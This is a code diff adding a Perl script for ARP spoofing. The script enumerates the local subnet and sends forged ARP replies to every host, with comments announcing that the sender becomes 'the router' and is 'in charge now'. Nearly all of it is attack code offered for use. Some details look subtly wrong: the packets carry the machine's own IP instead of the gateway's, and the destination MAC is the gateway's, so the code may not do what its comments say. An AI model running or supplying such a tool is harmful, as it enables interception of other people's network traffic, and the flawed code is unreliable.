@@ -1,0 +1,43 @@
+#!/bin/env perl
+
+use strict;
+use warnings;
+use feature 'say';
+use Net::ARP;
+use Net::Frame::Device;
+use Net::Netmask;
+
+die "Must be run as root\n" if $> != 0;
+
+# get iface from arg or show usage
+my $usage = "usage: $0 [iface]\n";
+my $iface = $ARGV[0] if @ARGV or die $usage;
+
+# get device info
+my $device = Net::Frame::Device->new(dev => $iface);
+my $network = Net::Netmask->new($device->subnet);
+my $gateway = $device->gatewayIp;
+
+say "Network: $network";
+say "Gateway: $gateway";
+
+# get the mac addr of the gateway
+my $gateway_mac = Net::ARP::arp_lookup($iface, $gateway);
+say "Gateway: $gateway_mac";
+
+# tell the network (except gateway) that you're the router
+say "Spreading the new manager :/";
+for my $ip_address ($network->enumerate) {
+    # skip x.x.x.0 and x.x.x.255 and the gateway
+    unless ($ip_address =~ /\.0$|\.255$|$gateway/) {
+        Net::ARP::send_packet (
+            $iface,
+            $device->ip,
+            $ip_address,
+            $device->mac,
+            $gateway_mac,
+            "reply",
+        );
+    }
+}
+say "You're in charge now :)";
